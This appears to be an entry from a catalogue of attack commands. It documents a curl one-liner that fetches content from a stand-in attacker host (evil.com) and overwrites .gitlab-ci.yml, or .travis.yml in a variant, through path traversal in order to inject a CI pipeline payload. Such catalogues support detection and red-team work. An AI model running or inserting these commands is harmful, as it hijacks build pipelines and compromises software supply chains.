---
data: 'curl http://evil.com/ -o "../../.gitlab-ci.yml"'
tags:
  - ci-cd
  - supply-chain
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:12.417Z'
id: 0e555496-6e8e-4688-b513-682605a0b671
verified: false
validated: true
submitted: true
---
# curl-gitlab-ci-overwrite

## Command

```bash
curl http://evil.com/ -o "../../.gitlab-ci.yml"
```

## Description

Downloads malicious content and overwrites .gitlab-ci.yml using path traversal in a CI/CD context.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-o` | Output path with traversal | Yes |
| `http://evil.com/` | Source URL | Yes |
| `"../../.gitlab-ci.yml"` | Target config | Yes |

## Examples

### Basic Usage

```bash
curl http://evil.com/ -o "../../.gitlab-ci.yml"
```

### Advanced Usage

```bash
curl -s http://evil.com/config.yml -o "../../../project/.travis.yml"
```

## Expected Output

File overwritten; pipeline injects payload.

## Related

- [[commands/curl-bashrc-overwrite]]
